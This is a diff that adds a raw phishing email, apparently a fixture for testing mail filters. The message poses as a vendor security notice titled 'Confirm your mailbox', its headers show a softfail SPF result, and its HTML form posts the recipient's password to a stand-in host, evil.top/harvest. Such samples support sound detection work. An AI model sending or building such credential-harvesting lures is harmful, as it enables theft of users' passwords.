@@ -1,0 +1,15 @@
+From: security@vendor.example
+To: user@company.local
+Subject: Confirm your mailbox
+Message-ID: <sus9@vendor.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Authentication-Results: mx.company.local; spf=softfail; dkim=pass; dmarc=pass
+
+<html><body>
+<p>Confirm your identity:</p>
+<form action="https://evil.top/harvest" method="post">
+<input name="password" type="password"/>
+<button type="submit">Sign in</button>
+</form>
+</body></html>
